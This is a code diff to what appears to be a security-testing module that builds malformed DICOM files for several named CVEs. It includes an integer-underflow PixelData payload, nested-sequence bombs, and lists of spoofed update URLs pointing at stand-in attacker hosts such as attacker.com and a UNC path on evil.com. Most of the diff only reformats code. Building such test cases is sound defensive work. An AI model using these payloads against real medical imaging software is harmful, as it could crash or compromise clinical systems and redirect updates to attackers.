@@ -23,31 +23,28 @@ def mutate_cve_2025_11266(data: bytes) -> list[tuple[str, bytes]]:
     seq_delim = b"\xfe\xff\xdd\xe0"
 
     # Variant 1: Integer underflow trigger
+    malicious_encap = (
+        pixel_data_tag
+        + b"OB\x00\x00"
+        + b"\xff\xff\xff\xff"
+        + item_tag
+        + b"\x00\x00\x00\x00"
+        + item_tag
+        + struct.pack("<I", 0xFFFFFFFF)  # Underflow trigger
+        + b"\xff" * 16
+        + item_tag
+        + b"\x00\x00\x00\x00"
+        + seq_delim
+        + b"\x00\x00\x00\x00"
+    )
     result = bytearray(data)
     idx = data.find(pixel_data_tag)
     if idx == -1:
-        malicious_encap = (
-            pixel_data_tag
-            + b"OB\x00\x00"
-            + b"\xff\xff\xff\xff"
-            + item_tag
-            + b"\x00\x00\x00\x00"
-            + item_tag
-            + struct.pack("<I", 0xFFFFFFFF)  # Underflow trigger
-            + b"\xff" * 16
-            + item_tag
-            + b"\x00\x00\x00\x00"
-            + seq_delim
-            + b"\x00\x00\x00\x00"
-        )
+        # No PixelData -- append encapsulated payload
         result = result[:-4] + malicious_encap + result[-4:]
     else:
-        search_start = idx + 8
-        fragment_idx = result.find(item_tag, search_start)
-        if fragment_idx != -1:
-            length_pos = fragment_idx + 4
-            if length_pos + 4 < len(result):
-                result[length_pos : length_pos + 4] = b"\xff\xff\xff\xff"
+        # Replace existing PixelData with malicious encapsulated version
+        result = result[:idx] + malicious_encap + result[-4:]
 
     variants.append(("integer_underflow", bytes(result)))
 
@@ -177,7 +174,10 @@ def mutate_cve_2025_1001(data: bytes) -> list[tuple[str, bytes]]:
         (b"https://attacker.com/DicomViewer_Update.exe", "attacker_domain"),
         (b"http://localhost:8080/malicious_update.msi", "localhost_bypass"),
         (b"\\\\evil.com\\updates\\viewer.exe", "unc_path"),
-        (b"https://update.legitimate-domain.com.attacker.com/update", "subdomain_spoof"),
+        (
+            b"https://update.legitimate-domain.com.attacker.com/update",
+            "subdomain_spoof",
+        ),
         (b"https://DicomViewer.com@attacker.com/update.exe", "url_userinfo"),
     ]
 
@@ -239,7 +239,9 @@ def mutate_cve_2025_1002(data: bytes) -> list[tuple[str, bytes]]:
 
         if data.find(retrieve_url_tag) == -1:
             insert_pos = min(200, len(result) - 4)
-            url_element = retrieve_url_tag + b"UR" + struct.pack("<H", len(mitm_url)) + mitm_url
+            url_element = (
+                retrieve_url_tag + b"UR" + struct.pack("<H", len(mitm_url)) + mitm_url
+            )
             result = result[:insert_pos] + url_element + result[insert_pos:]
 
         variants.append((f"mitm_{variant_name}", bytes(result)))
@@ -361,7 +363,9 @@ def mutate_cve_2024_33606(data: bytes) -> list[tuple[str, bytes]]:
                 break
         else:
             insert_pos = min(300, len(result) - 4)
-            url_element = retrieve_url_tag + b"UR" + struct.pack("<H", len(payload)) + payload
+            url_element = (
+                retrieve_url_tag + b"UR" + struct.pack("<H", len(payload)) + payload
+            )
             result = result[:insert_pos] + url_element + result[insert_pos:]
 
         variants.append((f"url_scheme_{variant_name}", bytes(result)))
@@ -391,7 +395,11 @@ def mutate_cve_2022_24193(data: bytes) -> list[tuple[str, bytes]]:
         nested = b""
         for _ in range(depth):
             nested = (
-                item_start + b"\xff\xff\xff\xff" + nested + item_end + b"\x00\x00\x00\x00"
+                item_start
+                + b"\xff\xff\xff\xff"
+                + nested
+                + item_end
+                + b"\x00\x00\x00\x00"
             )
 
         sq_tag = b"\x08\x00\x05\x11"
